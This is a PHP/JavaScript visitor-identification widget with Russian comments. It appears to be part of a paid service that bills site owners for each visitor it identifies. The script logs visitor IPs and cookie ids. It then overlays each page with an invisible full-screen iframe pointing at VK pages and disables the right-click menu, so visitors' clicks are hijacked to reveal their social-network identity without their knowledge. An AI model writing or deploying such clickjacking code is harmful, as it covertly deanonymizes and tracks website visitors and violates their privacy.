<?php
include 'DB.php';

$db = DB::instance();
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";

$base_url = $protocol.$_SERVER['HTTP_HOST'];

$mysstype = 0;
$mysocnid = 0;
$mytimer = 0;

$mycook = $_GET['a8'];

$remoteip = $_SERVER['REMOTE_ADDR'];

$userId = (int)$_GET['uid']; //uid

$userHost = $_GET['a7'];

$userHost = str_replace('www.', '', $userHost);

$identifyPrice = $db->select("SELECT `value` FROM `setting` WHERE `title` = 'identify_price'")->find()->value;
// Ищем юзера.
$user = $db->select("SELECT * FROM `user` WHERE `id` = :userId", array(':userId' => $userId))->find();

if (empty($user->id) || $user->balance < $identifyPrice) {
	// no money no honey!
	die('no money no honey!');
}

// Ищем сайт пользователя.
$site = $db->select("SELECT * FROM `user_sites` WHERE `userId` = :userId AND `url` = :url",
 array(':userId' => $userId, ':url' => 'http://' . $userHost))->find();
 
if (empty($site->id)) {
	// no site!
	die('no site!');
}

// Проверяем был ли пользователь уже идентифицирован.
if ($mycook != 'null') {
	$client = $db->select("SELECT * FROM `user_log` WHERE `id` = :id AND `userId` = :userId", array(':id' => $mycook, ':userId' => $userId))->find();
	
	if(isset($client->id) && $client->isAuth == 1) {
		// already identify!
		die('already identify!');
	}
}
?>
if( navigator.userAgent.match( "Android|BackBerry|phone|iPad|iPod|IEMobile|Nokia|Mobile|MSIE|iPhone|webOS|Windows Phone|Explorer|Trident" )  )  {
	mnoload = false; } else { mnoload = true; }

isSafari = !!navigator.userAgent.match(/Version\/[\d\.]+.*Safari/); 

if (isSafari) { mnoload = false; }

if (!navigator.cookieEnabled) { mnoload = false; }

function are_cookies_enabled() {
	var cookieEnabled = (navigator.cookieEnabled) ? true : false;
	if (typeof navigator.cookieEnabled == "undefined" && !cookieEnabled) { 
		cookieEnabled = (document.cookie.indexOf("mywitget") != -1) ? true : false;
	}
	return (cookieEnabled);
}

function setCookie (name, value, expires, path, domain, secure) {
      document.cookie = name + "=" + escape(value) +
        ((expires) ? "; expires=" + expires : "") +
        ((path) ? "; path=" + path : "") +
        ((domain) ? "; domain=" + domain : "") +
        ((secure) ? "; secure" : "");
}

function getCookie(name) {
	var cookie = " " + document.cookie;
	var search = " " + name + "=";
	var setStr = null;
	var offset = 0;
	var end = 0;
	if (cookie.length > 0) {
		offset = cookie.indexOf(search);
		if (offset != -1) {
			offset += search.length;
			end = cookie.indexOf(";", offset)
			if (end == -1) {
				end = cookie.length;
			}
			setStr = unescape(cookie.substring(offset, end));
		}
	}
	return(setStr);
}

if (!are_cookies_enabled()) {
	mnoload = false;
}

<?php
// Ставим куки если юзер уже был.
if ($mycook == 'null') {
	$cookid = $db->insert("INSERT INTO `user_log` (`userId`, `ip`) VALUES (:userId, :ip)", array(':userId' => $userId, ':ip' => $_SERVER['REMOTE_ADDR']));
print 'setCookie("my1witid'.$userId.'","'.$cookid.'", "Mon, 01-Jan-2016 00:00:00 GMT", "/");';
} else {
	$cookid = $mycook;
}
?>

var myyaid;
var myis1 = document.cookie.split('_ym_visorc_');
if (myis1[1] !== undefined) {
	myyaid = myis1[1].split('=')[0];
} else {
	myyaid = '';
}

iframe_url = '<?= $base_url?>/vk/step2v<?=$mysstype?>.php?host='+location.host+'&id=<?=$mysocnid?>&ckid=<?=$cookid?>&userId=<?= $userId?>';
iframe_urlmap = '<?= $base_url?>/vk/step6.php?host='+location.host;
var mycity;
var mywhitecity = [<?php 

?>];
var mytimer;
var isshow = 0;
if( mnoload ) {
	var sf2 = document.createElement('div');
		sf2.innerHTML = '<iframe src="'+iframe_urlmap+'" name="mywitget2" id="mywitget2" frameborder="no" scrolling="no" allowtransparency style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; filter:alpha(opacity=0); opacity:0; cursor: pointer; z-index:88888;" /><\/iframe>'; 
		(document.getElementsByTagName('html')[0] || document.body).appendChild( sf2 );
		sf2 = document.getElementById("mywitget2");
		sf2.style.visibility = "hidden";
		sf2.style.height = "1px";
		sf2.style.width = "1px";
		sf2.parent = undefined;


	
}

function mysoc2() {
	var mytint = parseInt(getCookie("mywitgettimer"));
	if (mytint > 0) {
		mytimer = setInterval(function() { mysoc1(); }, 1000);
	} else {
		setCookie("mywitgettimer","<?=$mytimer?>", "Mon, 01-Jan-2016 00:00:00 GMT", "/");
		mytimer = setInterval(function() { mysoc1(); }, 1000);
	}
}

function mysoc1() {
	var mytint = parseInt(getCookie("mywitgettimer"));
	mytint = mytint-1;
	console.log(mytint);
	if (mytint > 0) {
		setCookie("mywitgettimer",mytint.toString(), "Mon, 01-Jan-2016 00:00:00 GMT", "/");
	} else {
		clearInterval(mytimer);
		mysoc();
	}
}

function mysoc() {
		document.oncontextmenu = new Function("return false;");

		var sf = document.createElement('div');
		sf.innerHTML = '<iframe src="'+iframe_url+'" name="mywitget" id="mywitget" frameborder="no" scrolling="no" allowtransparency style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; filter:alpha(opacity=0); opacity:0; cursor: pointer; z-index:88888;" /><\/iframe>'; 
		(document.getElementsByTagName('html')[0] || document.body).appendChild( sf );
		sf = document.getElementById("mywitget");
		sf.style.visibility = "hidden";
		sf.style.height = "1px";
		sf.style.width = "1px";
		sf.parent = undefined;
}

onmessage = function(evnt) {
		if (evnt.data.str=='myhide1') {
			document.getElementById('mywitget').style.visibility = "hidden";
			document.getElementById("mywitget").style.height = "1px";
			document.getElementById("mywitget").style.width = "1px";
			setCookie("mywitget","<?=$userId?>", "Mon, 01-Jan-2016 00:00:00 GMT", "/");
			if (myyaid != '') {
				eval('yaCounter'+myyaid+'.reachGoal("vk")');
			}
		}
		if (evnt.data.str=='myhide2') {
			document.getElementById('mywitget').style.visibility = "hidden";
			document.getElementById("mywitget").style.height = "1px";
			document.getElementById("mywitget").style.width = "1px";
			setCookie("mywitget","0", "Mon, 01-Jan-2016 00:00:00 GMT", "/");
		}
		if (evnt.data.str=='myshow') {
			document.getElementById('mywitget').style.visibility = "visible";
			document.getElementById("mywitget").style.height = "100%";
			document.getElementById("mywitget").style.width = "100%";
			if (isshow == 0) {
				isshow = 1;
				(new Image).src = "<?=$base_url?>/vk/isshow.php?cid=<?=$cookid?>";
			}
		}
		if (evnt.data.str=='mymap') {
			mycity = evnt.data.city;
			mysoc2();
		}
}



